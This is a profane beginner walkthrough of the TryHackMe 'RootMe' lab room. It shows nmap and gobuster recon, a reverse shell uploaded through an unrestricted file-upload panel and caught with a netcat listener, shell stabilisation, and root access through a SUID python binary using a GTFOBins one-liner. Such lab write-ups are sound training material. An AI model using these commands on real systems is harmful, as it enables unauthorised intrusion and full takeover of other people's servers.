# Hello World?

So tbh this was supposed to be a programming tutorial but....

SIKE! We're gonna go do the fast lane, so buckle up, you're in for the ride whether you like it or not!

## Tools

Ok, so before we begin, be sure you have a nice stable linux distro at your disposal or just use windows if you're a psychopath (if you use arch, stfu and follow, we don't need to hear about it). Done? Now make sure you have the following with ya:

1. [`nmap`](https://nmap.org/): For port scanning (or just use [`rustscan`](https://rustscan.github.io/RustScan/) if you're cool like me ;D)
2. [`gobuster`](https://github.com/OJ/gobuster) or [`ffuf`](https://github.com/ffuf/ffuf) or [`feroxbuster`](https://github.com/epi052/feroxbuster): For fuzzing and stuff like directory enumeration.
3. [`hydra`](https://github.com/vanhauser-thc/thc-hydra): For brute forcing passwords and stuff
4. [`BurpSuite`](https://portswigger.net/burp): For fucking webapps/websites in the ass (literally)

And... that's all. No, really. You won't need much. I _will_ be mentioning tools and using all kinds of things, so be sure to know how to get stuff and install it because it's quite the essential skill.&#x20;

## Hack The World!

Idk about the titles, feel free to suggest stuff.

Before we begin, get a [`TryHackMe`](https://tryhackme.com/) account, go to their [`Access`](https://tryhackme.com/access) page and get, well, _access_ (the `openvpn` file). Once you got that, connect to the VPN. We're gonna start off by doing the [`RootMe`](https://tryhackme.com/room/rrootme) room. (Yeah, ikr!)

### Step 1: Recon

I hear you, I hear you. Probably having a shit ton of questions, like _what are ports?_ or something like _you should probably slow down for the beginners_. The last one is not a question, but yeah... I know this is kinda confusing but you know what?&#x20;



<details>

<summary>...</summary>

FUCK YOU! This is the fast lane bitches HAHAHAHAHA!&#x20;

You don't _need_ to understand every small detail. Just memorize all the steps for now. You'll understand sooner or later.&#x20;



Guess what? If you don't understand it, JUST GOOGLE IT BUDDY. Honestly, if you don't make it into a hobby to read computer science stuff and security theory in your free time you're quite fucked. Sure you'll be able to do some stuff, but good fucking luck growing  and getting someplace real.

</details>

Now that that's done, let's do some port scanning. Here's the command to do that. Don't forget to connect to the VPN and fire up the VM in the tryhackme (THM) room.

```shell-session
n00bie@NOT_ARCH $ sudo nmap -p- -sS -sV -oN ports.txt TARGET_IP 
```

Now, if you weren't a dumbass and if everything goes well, you should see something like this:

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-13 00:27 BST
Nmap scan report for TARGET_IP
Host is up (0.083s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.91 seconds
```

Woah, lots of text... **s c a r y** :skull:

Well, not really. See that text carefully? Here's what we're interested in:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Basically, there's a `ssh` service running on port 22. Port 80 has a http server running Apache on it, which basically means that if you look up: `http://TARGET_IP:80/` on a web browser, you'll be greeted with a webapp/webpage.&#x20;

Since there's a website running, we can use `gobuster` to fuzz and find directories on the web application. Think of these as places you can go inside the webapp. Sometimes devs make a woopsie and forget to restrict access to those and we can go to places where we are not supposed to be. (God that's a cringe way of explaining this but I'll keep it for content ig).

Here's a neat little command to do what I just mentioned:

```shell-session
n00bie@NOT_ARCH$ gobuster dir -u http://TARGET_IP:80/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 32 -o direnum.txt
```

{% hint style="info" %}
If you don't have that wordlist, don't worry, just visit [`Seclists`](https://github.com/danielmiessler/SecLists) to get it. There's also a package called `seclists` on kali that you can use `apt` to get.
{% endhint %}

This'll take some time, so you should go get a fucking coffee or something idk. Done? Now let's have a look at what we got:

<details>

<summary>gobuster</summary>

```shell-session
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.55.244/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/04/13 11:57:47 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 314] [--> http://10.10.55.244/uploads/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.55.244/css/]    
/js                   (Status: 301) [Size: 309] [--> http://10.10.55.244/js/]     
/panel                (Status: 301) [Size: 312] [--> http://10.10.55.244/panel/]
```

</details>

Lots of text... _again_. BUT WAIT, it's the same as `nmap`, there's only a specific section we're interested in:

```
/uploads              (Status: 301) [Size: 314] [--> http://10.10.55.244/uploads/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.55.244/css/]    
/js                   (Status: 301) [Size: 309] [--> http://10.10.55.244/js/]     
/panel                (Status: 301) [Size: 312] [--> http://10.10.55.244/panel/]
```

This shows us the places we can visit. Try visiting some of them, see what's up and most importantly... _**see if you can break something by goofing around.**_



Done? Good. Now it's time for phase 2

### Step 2: Initial Access

If you did not notice yet, or don't know, the `/panel` place allows us to upload stuff to the website and the `/uploads` place lists them for us to be able to access them (duh!). Now, the question is... _how the fuck do we exploit this to get into the system??_

Simple! Use something called a **Reverse shell.** Don't have one? No idea how to write one? Just look it up, here's a nice website for it:

{% embed url="https://www.revshells.com/" %}

Get the `Pentestmonkey` one (phunny name hehe). Modify fill in the fields on the website to match your IP (`ip addr` on your system, grab the `tun0` one), and change the port to 4444, and upload that sucker!



Next, we start a listener on our systems:

```shell-session
n00bie@NOT_ARCH$ nc -nvlp 4444
listening on [any] 4444 ...
```

Cool! DONT TOUCH IT NOW, KEEP IT RUNNING!

Go to the `/uploads` path and try and access the file you uploaded. The page will look like it's stuck or keeps loading forever. Don't worry, keep it as it is and go back to the listener:

```shell-session
n00bie@NOT_ARCH$ nc -nvlp 4444
listening on [any] 4444 ...
...
/bin/sh: 0: can't access tty; job control turned off
$ 
```

BOOM, now you have a shell on the remote server! (HOW FUCKING COOL IS THAT, RIGHT?)

BUT WAIT! THERE'S MORE! You see, if you don't wanna die a very painful death by trying to operate in an unstable reverse shell, you're free to continue, but for those of you who _don't_ wanna get fucked, let's stabilize this shell. Follow these exactly:

1. `python -c 'import pty; pty.spawn("/bin/bash")'` in the shell session you have.
2. Ctrl+Z to background the process
3. `stty -raw echo && fg` (This may make your terminal looked fucked, dw just continue)
4. `export TERM=xterm`

Done! Now if you did not fuck up, you should have a stable shell which can be cleared and you can do `Ctrl+C` to stop processes. If you _did_ fuck up, don't worry, just start another listener and try accessing the payload file from `/uploads` again to get another different reverse shell.

You now have _stable shell access to a remote server_. This... is initial access, now we do something even better. Get root/admin access :>



### Step 3: Privilege Escalation&#x20;

This is one of the parts where you won't have one fucking clue why I do what I do, but still follow along and remember whatever details you can. We're gonna do something called _Exploiting the SUID bit_. (Because the room gives us a hint to use that)

Here's a command to search for all the files which have their SUID bit set:

```shell-session
n00bie@NOT_ARCH$ find / -perm /u=s,g=s 2>/dev/null
```

You'll see a bunch of shit, most of it is useless, but one stands out:

```
/usr/bin/python
```

Look it up on [`GTFOBins`](https://gtfobins.github.io/):

{% embed url="https://gtfobins.github.io/gtfobins/python/#suid" %}

You'll find the command there, executing that gives us root/admin access:

```shell-session
n00bie@NOT_ARCH$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
root@NOT_ARCH# whoami
root
```

And... that's how you hack. Like it? Don't worry, it'll get a lot more _fun_ as we go ahead.

